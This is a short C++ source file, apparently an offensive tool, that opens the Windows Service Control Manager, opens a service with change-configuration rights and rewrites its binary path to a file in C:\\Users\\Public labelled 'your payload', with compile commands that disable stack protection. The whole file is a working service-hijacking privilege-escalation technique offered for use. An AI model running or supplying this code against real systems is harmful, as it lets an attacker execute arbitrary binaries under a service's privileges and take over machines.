// "c:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /EHsc /nologo /Ox /MT /W0 /GS- /DNDDEBUG /TP change_service_config.cpp /link /OUT:change_service_config.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 Advapi32.lib

#include <windows.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[])
{

    // Store the service name (e.g., WpnUserService_550b1)
    LPCSTR serviceName = "TEST";
    LPCSTR newBinPath = "C:\\Users\\Public\\server.exe"; // Path to your payload

    // Open the Service Control Manager with full access
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT|SC_MANAGER_ENUMERATE_SERVICE|SC_MANAGER_QUERY_LOCK_STATUS|STANDARD_RIGHTS_READ);
    if (hSCManager == NULL) {
        wprintf(L"OpenSCManager failed (%d)\n", GetLastError());
        return 1;
    }

    // Open the service with SERVICE_CHANGE_CONFIG access
    SC_HANDLE hService = OpenService(hSCManager, serviceName, SERVICE_CHANGE_CONFIG);
    if (hService == NULL) {
        wprintf(L"OpenService failed (%d)\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return 1;
    }

    // Attempt to change the service's binPath
    BOOL success = ChangeServiceConfig(
        hService,               // Service handle
        SERVICE_NO_CHANGE,      // Service type (no change)
        SERVICE_NO_CHANGE,      // Start type (no change)
        SERVICE_NO_CHANGE,      // Error control (no change)
        newBinPath,             // New binary path
        NULL,                   // Load order group (no change)
        NULL,                   // Tag ID (no change)
        NULL,                   // Dependencies (no change)
        NULL,                   // Service start name (no change)
        NULL,                   // Password (no change)
        NULL                    // Display name (no change)
    );

    if (!success) {
        wprintf(L"ChangeServiceConfig failed (%d)\n", GetLastError());
    }
    else {
        wprintf(L"ChangeServiceConfig succeeded!\n");
    }
    // Clean up
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}